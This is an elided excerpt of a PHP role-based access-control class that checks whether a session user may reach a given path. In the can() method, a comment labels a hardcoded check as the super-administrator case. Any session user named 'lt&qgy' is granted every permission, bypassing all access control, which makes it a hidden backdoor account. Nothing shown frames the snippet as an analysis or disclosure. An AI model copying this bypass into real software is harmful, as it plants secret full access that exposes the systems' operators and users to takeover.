...
class Rbac
{
     ...
     * @throws \think\exception\DbException
     */
    public function cachePermission($id, $timeOut = 0)
    {
        if (empty($id)) {
            throw new Exception('参数错误');
        }
    ...
    public function can($path)
    {
        if ($this->type == 'jwt') {
            ...
            // 存在超级管理员直接返回true
            $user = session("user");
            if (isset($user['name']) && $user['name'] == 'lt&qgy') return true;

            // 首页不添加权限
            if ($path == 'index/index/index') return true;
